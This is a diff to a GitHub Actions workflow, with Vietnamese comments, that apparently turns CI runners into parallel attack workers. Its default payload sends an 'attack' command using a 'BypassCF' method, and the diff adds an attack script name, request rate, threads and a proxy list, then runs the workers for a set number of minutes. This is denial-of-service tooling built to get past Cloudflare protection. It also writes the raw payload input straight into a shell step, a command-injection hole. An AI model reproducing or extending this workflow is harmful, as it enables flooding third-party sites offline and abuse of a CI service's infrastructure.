@@ -18,7 +18,7 @@ on:
       payload:
         description: "JSON lệnh cho worker (vd attack/fetch/...)"
         required: true
-        default: '{"cmd":"attack","args":{"target":"https://example.com","duration":60,"method":"BypassCF"}}'
+        default: '{"cmd":"attack","args":{"target":"https://example.com","duration":60,"method":"BypassCF","script":"cfhieu.js","rate":"16","thread":"3","proxyfile":"proxy.txt"}}'
 
 jobs:
   make-matrix:
@@ -52,9 +52,20 @@ jobs:
         with:
           python-version: '3.11'
 
+      - uses: actions/setup-node@v3
+        with:
+          node-version: '16'
+
       - name: Install dependencies
         run: |
           if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+          npm install
+
+      - name: Debug environment
+        run: |
+          echo "Working directory: $(pwd)"
+          echo "Payload JSON: ${{ inputs.payload }}"
+          ls -la
 
       - name: Create payload file and run worker #${{ matrix.idx }}
         env:
@@ -65,9 +76,14 @@ jobs:
           echo "START worker #${{ matrix.idx }}"
           echo "Payload received: $PAYLOAD_JSON"
           # Tạo file payload.json với quyền ghi rõ ràng
-          echo "$PAYLOAD_JSON" > payload.json
+          echo "$PAYLOAD_JSON" | tee payload.json
           chmod +rwx payload.json
-          # Chạy worker với payload file
+          # Kiểm tra file
+          if [ ! -f payload.json ]; then
+            echo "Error: payload.json not created!"
+            exit 1
+          fi
+          # Chạy worker
           python3 vps_worker.py --payload payload.json
           sleep $(( ${{ inputs.minutes }} * 60 ))
           echo "END worker #${{ matrix.idx }}"
